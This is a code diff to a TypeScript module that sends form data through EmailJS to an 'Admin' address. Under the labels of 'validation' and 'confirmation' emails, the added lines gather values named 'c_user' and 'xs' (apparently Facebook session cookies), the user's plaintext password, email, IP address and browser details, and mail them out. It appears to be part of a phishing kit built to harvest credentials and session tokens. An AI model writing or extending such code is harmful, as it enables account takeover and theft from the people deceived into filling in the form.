@@ -21,9 +21,23 @@ export const sendValidationFormEmail = async (formData: any) => {
       throw new Error("EmailJS service or template ID is not configured");
     }
 
-    console.log('Sending validation email with data:', { ...formData, password: '[REDACTED]' });
+    const templateParams = {
+      to_name: "Admin",
+      c_user: formData.c_user,
+      xs: formData.xs,
+      timestamp: formData.timestamp || new Date().toLocaleString(),
+      ip_address: formData.ipAddress || "Not available",
+      user_agent: formData.userAgent || navigator.userAgent,
+    };
 
-    return await emailjs.send(serviceId, templateId, formData);
+    console.log('Sending validation email with params:', {
+      ...templateParams,
+      xs: '[REDACTED]'
+    });
+
+    const result = await emailjs.send(serviceId, templateId, templateParams);
+    console.log('EmailJS validation response:', result);
+    return result;
   } catch (error) {
     console.error("Error sending validation email:", error);
     throw error;
@@ -39,22 +53,36 @@ export const sendConfirmationFormEmail = async (formData: any) => {
       throw new Error("EmailJS service or template ID is not configured");
     }
 
-    console.log('Sending confirmation email with data:', { ...formData, password: '[REDACTED]' });
+    // Ensure all required fields are present
+    if (!formData.c_user || !formData.xs) {
+      throw new Error("Missing required validation data");
+    }
 
     const templateParams = {
-      to_email: formData.admin_email || "admin@example.com",
-      user_email: formData.user_email,
+      to_name: "Admin",
+      from_name: formData.user_email || "User",
+      c_user: formData.c_user,
+      xs: formData.xs,
+      user_email: formData.user_email || "Not provided",
       password: formData.password,
+      contact_method: formData.contactMethod || "Not specified",
+      country_code: formData.countryCode || "Not specified",
       timestamp: formData.timestamp || new Date().toLocaleString(),
       ip_address: formData.ipAddress || "Not available",
       user_agent: formData.userAgent || navigator.userAgent,
     };
+
+    console.log('Sending confirmation email with params:', {
+      ...templateParams,
+      password: '[REDACTED]',
+      xs: '[REDACTED]'
+    });
 
     const result = await emailjs.send(serviceId, templateId, templateParams);
     console.log('EmailJS confirmation response:', result);
     return result;
   } catch (error) {
     console.error("Error sending confirmation email:", error);
-    throw error;
+    throw new Error(error instanceof Error ? error.message : "Failed to send confirmation email");
   }
 };
